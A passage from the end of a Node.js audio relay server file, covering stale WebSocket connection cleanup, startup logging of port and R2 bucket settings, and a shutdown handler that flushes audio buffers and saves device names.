      try { ws.close(); } catch {}
      changed = true;
    }
  });
  if (changed) { stats.activeSenders = senders.size; broadcastSenderList(); }

  receivers.forEach((info, ws) => {
    if (now - info.lastHeartbeat > timeout) {
      console.log(`[CLEANUP] Stale receiver`);
      receivers.delete(ws);
      try { ws.close(); } catch {}
    }
  });
  stats.activeReceivers = receivers.size;
}, 30_000);

// ─── Start ───────────────────────────────────────────────────────────────────
(async () => {
  await loadUltimateDeviceNamesFromDisk();
  server.listen(PORT, () => {
    console.log('========================================');
    console.log('🎙️  Audio Relay Server Started');
    console.log('========================================');
    console.log(`Port: ${PORT}`);
    console.log(`R2 Bucket: ${R2_BUCKET}`);
    console.log(`R2 Account: ${process.env.R2_ACCOUNT_ID || '(not set)'}`);
    console.log(`Ultimate persist: ${ULTIMATE_PERSIST_FILE}`);
    console.log('========================================');
  });
})().catch((err) => {
  console.error('Fatal startup error:', err);
  process.exit(1);
});

process.on('SIGTERM', () => {
  console.log('SIGTERM: flushing buffers and shutting down...');
  (async () => {
    for (const name of audioBuffers.keys()) await flushBuffer(name);
    await persistUltimateDeviceNames();
    server.close(() => process.exit(0));
  })();
});
